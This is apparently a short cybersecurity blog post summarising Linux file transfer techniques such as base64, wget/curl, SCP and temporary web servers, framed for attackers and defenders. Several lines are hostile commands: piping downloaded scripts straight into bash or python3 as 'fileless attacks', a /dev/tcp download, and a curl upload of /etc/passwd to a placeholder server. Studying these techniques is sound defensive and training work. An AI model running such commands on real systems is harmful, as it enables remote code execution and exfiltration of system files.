---
title: "Linux File Transfer Methods"
date: 2025-03-16
tags: [Linux, File Transfer, Security]
categories: [Cybersecurity, Linux]
pinned: false
---

## Overview
Linux provides various methods for transferring files, essential for both attackers and defenders in cybersecurity. Understanding these methods helps in securing systems and preventing unauthorized file transfers.

## Common File Transfer Methods
### 1. **Base64 Encoding/Decoding**
Used for transferring files without network communication. Encode files into a Base64 string, transfer via terminal, and decode on the target machine.

```bash
# Encode
cat file.txt | base64 -w 0; echo

# Decode
echo -n 'encoded_string' | base64 -d > file.txt
```

### 2. **Web Downloads with Wget and cURL**
Two widely used utilities for downloading files from the web.

```bash
# Using wget
download_url="https://example.com/file.sh"
wget -O /tmp/file.sh $download_url

# Using curl
curl -o /tmp/file.sh $download_url
```

### 3. **Fileless Attacks**
Execute scripts directly without saving to disk.

```bash
# Execute script directly from URL
curl https://example.com/script.sh | bash
wget -qO- https://example.com/script.py | python3
```

### 4. **Bash (/dev/tcp) Download**
Useful when no traditional tools are available.

```bash
# Establish connection
exec 3<>/dev/tcp/target_ip/80
# Request file
echo -e "GET /file.sh HTTP/1.1\n\n" >&3
# Read response
cat <&3
```

### 5. **SSH-Based Transfers**
Securely transfer files between systems using SCP.

```bash
# Download file from remote server
scp user@remote:/path/to/file .

# Upload file to remote server
scp file.txt user@remote:/path/to/destination
```

## Upload Operations
### 1. **Web Uploads with Curl**
Upload files using HTTP POST requests.

```bash
curl -X POST https://server/upload -F 'file=@/etc/passwd' --insecure
```

### 2. **Hosting a Temporary Web Server**
Start a simple web server for file transfer.

```bash
# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000
```

## Conclusion
Understanding Linux file transfer methods is crucial for cybersecurity professionals. Attackers leverage these techniques for infiltration, while defenders must monitor and mitigate risks effectively.

